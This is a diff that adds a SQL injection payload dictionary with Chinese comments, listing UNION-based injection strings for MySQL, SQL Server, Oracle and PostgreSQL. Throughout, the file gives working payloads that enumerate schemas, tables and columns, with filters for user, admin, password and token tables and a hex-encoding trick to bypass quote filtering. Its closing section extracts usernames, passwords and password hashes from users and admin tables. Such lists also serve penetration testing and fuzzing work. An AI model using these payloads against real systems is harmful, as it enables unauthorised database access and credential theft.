@@ -1,0 +1,105 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 04 表名与列名提取类
+# 用途: 获取数据库中的所有表名和列名
+# 适用: 覆盖 MySQL / SQL Server / Oracle / PostgreSQL
+# 注意: 替换 N 为实际列数，database_name 为目标库名
+# ============================================================
+
+# ============================================================
+# MySQL — 使用 information_schema
+# ============================================================
+
+# ---- 获取所有数据库名 ----
+UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),N FROM information_schema.schemata--
+UNION SELECT 1,SCHEMA_NAME,N FROM information_schema.schemata LIMIT 1 OFFSET 0--
+UNION SELECT 1,SCHEMA_NAME,N FROM information_schema.schemata LIMIT 1 OFFSET 1--
+
+# ---- 获取当前数据库的所有表名 ----
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database()--
+UNION SELECT 1,TABLE_NAME,N FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 1 OFFSET 0--
+UNION SELECT 1,TABLE_NAME,N FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 1 OFFSET 1--
+
+# 指定数据库名
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=0x64617461626173655f6e616d65--
+
+# 常用表名过滤
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%user%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%admin%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%login%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%member%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%pass%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%key%'--
+UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),N FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE '%token%'--
+
+# ---- 获取指定表的所有列名 ----
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='users'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='user'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='admin'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='members'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='login'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='user_login'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='credentials'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='tbl_users'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='wp_users'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='customer'--
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='employee'--
+
+# 带库名条件
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME='users' AND TABLE_SCHEMA=database()--
+
+# 十六进制表名绕过引号过滤
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),N FROM information_schema.columns WHERE TABLE_NAME=0x7573657273--
+
+# 带类型信息
+UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME,':',COLUMN_TYPE),N FROM information_schema.columns WHERE TABLE_NAME='users'--
+
+# ============================================================
+# SQL Server — 使用 sys.tables / sys.columns
+# ============================================================
+
+# 获取表名
+UNION SELECT 1,(SELECT STRING_AGG(name,',') FROM sys.tables),N--
+UNION SELECT 1,(SELECT TOP 1 name FROM sys.tables),N--
+UNION SELECT 1,(SELECT name FROM sys.tables FOR JSON PATH),N--
+
+# 获取列名
+UNION SELECT 1,(SELECT STRING_AGG(c.name,',') FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'),N--
+
+# ============================================================
+# Oracle — 使用 all_tables / all_tab_columns
+# ============================================================
+
+# 获取表名（注意 Oracle 表名默认大写）
+UNION SELECT 1,(SELECT LISTAGG(table_name,',') FROM all_tables WHERE owner='SYSTEM'),N FROM dual--
+UNION SELECT 1,(SELECT table_name FROM all_tables WHERE rownum=1),N FROM dual--
+UNION SELECT 1,(SELECT table_name FROM all_tables WHERE rownum=1 AND table_name LIKE '%USER%'),N FROM dual--
+
+# 获取列名
+UNION SELECT 1,(SELECT LISTAGG(column_name,',') FROM all_tab_columns WHERE table_name='USERS'),N FROM dual--
+UNION SELECT 1,(SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND rownum=1),N FROM dual--
+
+# ============================================================
+# PostgreSQL — 使用 information_schema
+# ============================================================
+
+# 获取表名
+UNION SELECT 1,STRING_AGG(table_name,','),N FROM information_schema.tables WHERE table_schema=current_schema()--
+UNION SELECT 1,table_name,N FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--
+
+# 获取列名
+UNION SELECT 1,STRING_AGG(column_name,','),N FROM information_schema.columns WHERE table_name='users'--
+
+# ============================================================
+# 数据提取类（放在这里方便使用）
+# ============================================================
+
+# MySQL — 提取数据
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password)),N FROM users--
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password,email)),N FROM user--
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password)),N FROM admin--
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password_hash)),N FROM admin--
+
+# 限制条数
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password)),N FROM users LIMIT 1 OFFSET 0--
+UNION SELECT 1,GROUP_CONCAT(CONCAT_WS('|',id,username,password)),N FROM users LIMIT 1 OFFSET 1--
